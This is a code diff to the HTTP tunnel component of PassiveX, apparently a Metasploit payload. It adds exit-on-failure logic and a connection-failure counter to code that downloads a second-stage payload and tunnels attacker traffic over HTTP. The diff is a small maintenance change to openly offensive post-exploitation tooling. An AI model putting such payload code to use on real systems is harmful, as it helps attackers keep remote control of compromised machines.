@@ -1,10 +1,8 @@
-/*
- *  This file is part of the Metasploit Exploit Framework
- *  and is subject to the same licenses and copyrights as
- *  the rest of this package.
- */
 #include "PassiveXLib.h"
 #include "HttpTunnel.h"
+
+// The number of failed HTTP connections
+static DWORD FailedConnections = 0;
 
 HttpTunnel::HttpTunnel()
 : HttpHost(NULL),
@@ -320,6 +318,15 @@ VOID HttpTunnel::DownloadSecondStage()
 				0,
 				&ThreadId);
 	}
+	else
+	{
+		CPassiveX::Log(
+				TEXT("DownloadSecondStage(): Failed to download second stage, %lu."),
+				GetLastError());
+
+		ExitProcess(0);
+
+	}
 }
 
 /*
@@ -540,9 +547,25 @@ DWORD HttpTunnel::TransmitHttpRequest(
 			*ResponsePayload = OutBuffer;
 		if (ResponsePayloadLength)
 			*ResponsePayloadLength = OutBufferLength;
+		
+		FailedConnections = 0;
 	}
 	else
-	{
+	{		
+		// If we fail to connect...
+		if (Result == ERROR_INTERNET_CANNOT_CONNECT)
+		{
+			FailedConnections++;
+
+			if (FailedConnections > 10)
+			{
+				CPassiveX::Log("TransmitHttpRequest(): Failed to connect to HTTP server (%lu), exiting.",
+						FailedConnections);
+
+				ExitProcess(0);
+			}
+		}
+
 		if (OutBuffer)
 			free(
 					OutBuffer);
@@ -568,7 +591,7 @@ ULONG HttpTunnel::SendThreadFunc()
 {
 	fd_set FdSet;
 	UCHAR  ReadBuffer[16384];
-	DWORD  BytesRead;
+	LONG   BytesRead;
 	INT    Result;
 
 	// This is the song that never ends...
@@ -611,7 +634,8 @@ ULONG HttpTunnel::SendThreadFunc()
 		if (BytesRead <= 0)
 		{
 			CPassiveX::Log(
-					TEXT("SendThreadFunc(): TUNNEL_IN: Read 0 or fewer bytes, erroring out.\n"));
+					TEXT("SendThreadFunc(): TUNNEL_IN: Read 0 or fewer bytes, erroring out (%lu).\n"),
+					BytesRead);
 			break;
 		}
 
@@ -629,6 +653,9 @@ ULONG HttpTunnel::SendThreadFunc()
 					Result);
 		}
 	}
+
+	// Exit the process if the send thread ends
+	ExitProcess(0);
 
 	return 0;
 }
